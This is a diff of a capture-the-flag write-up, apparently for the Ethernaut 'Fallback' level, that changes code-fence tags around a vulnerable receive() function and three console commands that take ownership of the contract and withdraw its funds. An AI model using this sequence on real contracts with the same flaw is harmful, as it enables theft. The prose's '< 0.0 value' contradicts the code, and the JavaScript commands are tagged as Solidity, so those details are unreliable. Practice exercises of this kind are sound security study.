@@ -7,7 +7,7 @@ the last one in the contract. It has to be external and payable.
 In our meme of a contract, we're provided with the following fallback method:
 
 
-```sol
+```solidity
 receive() external payable {
     require(msg.value > 0 && contributions[msg.sender] > 0);
     owner = msg.sender;
@@ -15,7 +15,7 @@ receive() external payable {
 ```
 
 Little needs to be said, we need to contribute once and then send a bogus transaction with < 0.0 value. Here are the commands:
-```
+```solidity
 contract.contribute({to: instance, from: player, value: toWei("0.0005", "ether")})
 sendTransaction({from: player, to: contract, value: toWei("0.0005", "ether")})
 contract.withdraw()
